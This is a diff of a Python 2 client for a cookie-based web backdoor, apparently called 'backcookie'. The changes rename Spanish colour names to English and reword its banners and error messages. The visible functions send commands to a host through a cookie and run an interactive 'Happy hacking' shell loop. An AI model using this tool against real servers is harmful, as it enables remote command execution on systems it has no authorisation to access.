@@ -36,10 +36,10 @@ else:
 
 # colors
 class color:
-    azul = '\033[94m'
-    rojo = '\033[91m'
-    verde = '\033[92m'
-    blanco = '\033[0m'
+    blue = '\033[94m'
+    red = '\033[91m'
+    green = '\033[92m'
+    white = '\033[0m'
 
 # class of header and encode
 class core:
@@ -50,11 +50,11 @@ class core:
     eb = 'base64'
         
 def Error():
-	print color.blanco + "\t\t-------------" + color.rojo + core.bc + color.blanco + "------------"
+	print color.white + "\t\t-------------" + color.red + core.bc + color.white + "------------"
 	print "\t\t+             Status              +"
 	print "\t\t+             sorry :(            +"
 	print "\t\t-----------------------------------\n\n"
-	print color.verde + "[-] " + color.rojo  + "Connection error !!!\n" + color.blanco
+	print color.blue + "[-] " + color.red  + "Connection Error...\n" + color.white
 	exit(0)
 
 def backcookie(command,host,cookie,vcmd,debugLevel=0):
@@ -69,18 +69,18 @@ def backcookie(command,host,cookie,vcmd,debugLevel=0):
 	except:
 		Error()
 	if v[0] == '0' or vcmd == "command": # vcmd > validate command
-		print color.azul + l.read().strip() + color.blanco
+		print color.blue + l.read().strip() + color.white
 	else:
 		Error()
 
 def shell(host,cookie):
 	backcookie("cd",host,cookie,"")
-	print color.blanco + "\t\t-------------" + color.rojo + core.bc + color.blanco + "------------"
+	print color.white + "\t\t-------------" + color.red + core.bc + color.white + "------------"
 	print "\t\t+    Developed by: @mrjopino      +"
 	print "\t\t+             To play             +"
 	print "\t\t-----------------------------------\n\n"
-	print color.verde + "[+] " + color.azul  + "Happy hacking" + color.blanco
-	print color.verde + "[+] " + color.azul  + "Sometimes it is not positive, but sometimes if!\n" + color.blanco
+	print color.green + "[+] " + color.blue  + "Happy hacking" + color.white
+	print color.green + "[+] " + color.blue  + "Sometimes it is not positive, but sometimes if!\n" + color.white
 
 	while True:
 
@@ -93,7 +93,7 @@ def shell(host,cookie):
 			print "\t\t+       Security researcher      +"
 			print "\t\t+            @mrjopino           +"
 			print "\t\t----------------------------------\n\n"
-			print color.azul + "[-] " + color.rojo + core.bc + " OFF\n" + color.blanco
+			print color.blue + "[-] " + color.red + core.bc + " OFF\n" + color.white
 			break
 
 def main():
